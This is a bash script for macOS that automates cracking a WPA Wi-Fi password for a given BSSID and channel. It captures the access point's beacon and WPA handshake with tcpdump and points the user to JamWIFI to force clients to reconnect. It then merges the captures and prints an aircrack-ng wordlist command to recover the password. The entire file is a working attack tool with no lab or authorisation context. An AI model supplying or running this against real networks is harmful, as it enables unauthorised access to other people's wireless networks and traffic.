#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: ./wifi_crack.sh BSSID CHANNEL"
    exit 1
fi


BSSID=$1
CHANNEL=$2

echo "BSSID: $BSSID"
echo "CHANNEL: $CHANNEL"

# 1. disassociate
sudo airport -z

# 2. set the channel
# DO NOT PUT SPACE BETWEEN -c and the channel
# for example sudo airport -c6
sudo airport -c$CHANNEL

# 3. capture a beacon frame from the AP
echo "Capturing beacon..."
sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en1 -w beacon.cap

# 4. wait for the WPA handshake
echo "Waiting for WPA handshake, please use JamWIFI (to simulate login into network)..."
sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en1 -w handshake.cap

# 5. merge the two files
mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap

echo "Now crack password: aircrack-ng -w wordlist.txt -b $BSSID capture.cap"